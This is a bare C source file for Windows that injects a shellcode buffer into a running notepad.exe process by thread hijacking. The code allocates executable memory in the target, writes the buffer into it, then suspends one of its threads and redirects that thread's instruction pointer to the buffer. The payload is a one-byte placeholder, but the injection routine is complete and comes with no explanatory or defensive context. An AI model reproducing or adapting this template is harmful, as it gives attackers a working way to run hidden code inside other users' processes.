#include <Windows.h>
#include <TlHelp32.h>

// shellcode
unsigned char buf[] = { 0x90 };

int main() {
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	PVOID remoteBuffer;
	THREADENTRY32 threadEntry;
	CONTEXT context;

	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (Process32First(hSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0) {
			Process32Next(hSnapshot, &processEntry);
		}
	}
	else {
		return 1;
	}
	CloseHandle(hSnapshot);

	HANDLE targetProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, processEntry.th32ProcessID);
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, buf, sizeof(buf), NULL);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while (Thread32Next(snapshot, &threadEntry)) {
		if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

	SuspendThread(threadHijacked);
	GetThreadContext(threadHijacked, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);
	ResumeThread(threadHijacked);

	CloseHandle(threadHijacked);
	CloseHandle(targetProcessHandle);

	return 0;
}